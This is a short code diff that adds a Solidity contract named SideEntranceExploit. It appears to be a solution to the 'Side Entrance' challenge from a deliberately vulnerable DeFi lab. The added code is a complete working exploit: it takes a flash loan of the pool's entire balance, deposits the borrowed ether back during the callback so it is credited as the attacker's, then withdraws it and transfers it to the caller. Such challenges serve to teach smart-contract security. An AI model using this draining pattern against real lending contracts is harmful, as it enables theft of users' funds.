@@ -40,3 +40,23 @@ contract SideEntranceLenderPool {
         }
     }
 }
+
+contract SideEntranceExploit is IFlashLoanEtherReceiver {
+    // fist: flash loan balance of the pool
+    function attack(address _pool) public {
+        SideEntranceLenderPool(_pool).flashLoan(address(_pool).balance);
+        // after flash loan, the balance of this contract will be balance of the pool
+        // then we can withdraw all balance of the pool
+        SideEntranceLenderPool(_pool).withdraw();
+        // then we can transfer all balance of this contract to ourself
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    // second: lender pool execute receiver when flash loan, msg.value will be the flash loan balance
+    function execute() external payable {
+        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
+    }
+
+    // receive ether from flash loan withdraw
+    receive() external payable {}
+}
